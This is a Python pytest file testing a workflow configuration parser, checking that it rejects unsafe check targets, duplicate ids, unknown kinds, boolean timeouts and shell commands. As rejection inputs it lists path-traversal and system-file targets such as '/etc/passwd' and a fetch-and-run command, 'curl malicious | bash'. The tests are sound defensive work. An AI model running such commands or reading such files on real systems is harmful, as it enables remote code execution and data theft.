import pytest
from devinstack.config import parse_workflow, WorkflowError


@pytest.fixture
def valid():
    return {"api_version": "devinstack.dev/v1alpha1", "kind": "RegressionWorkflow",
            "metadata": {"name": "gate"}, "validation": {"checks": [
                {"id": "syntax", "kind": "syntax", "target": ".", "required": True}]}}


def test_accepts_valid(valid):
    result = parse_workflow(valid)
    assert result.name == "gate"
    assert result.checks[0].timeout_seconds == 45


@pytest.mark.parametrize("target", ["../secrets", "/etc/passwd", "-rf", "~/code", "tests\\..\\.."]) 
def test_rejects_unsafe_targets(valid, target):
    valid["validation"]["checks"][0]["target"] = target
    with pytest.raises(WorkflowError):
        parse_workflow(valid)


def test_rejects_duplicate_ids(valid):
    valid["validation"]["checks"].append(dict(valid["validation"]["checks"][0]))
    with pytest.raises(WorkflowError, match="duplicate"):
        parse_workflow(valid)


def test_rejects_shell_commands(valid):
    valid["validation"]["checks"][0]["command"] = "curl malicious | bash"
    with pytest.raises(WorkflowError, match="Unsupported"):
        parse_workflow(valid)


def test_rejects_unknown_kind(valid):
    valid["validation"]["checks"][0]["kind"] = "bash"
    with pytest.raises(WorkflowError, match="Unsupported"):
        parse_workflow(valid)


def test_rejects_boolean_timeout(valid):
    valid["validation"]["checks"][0]["timeout_seconds"] = True
    with pytest.raises(WorkflowError, match="timeout"):
        parse_workflow(valid)
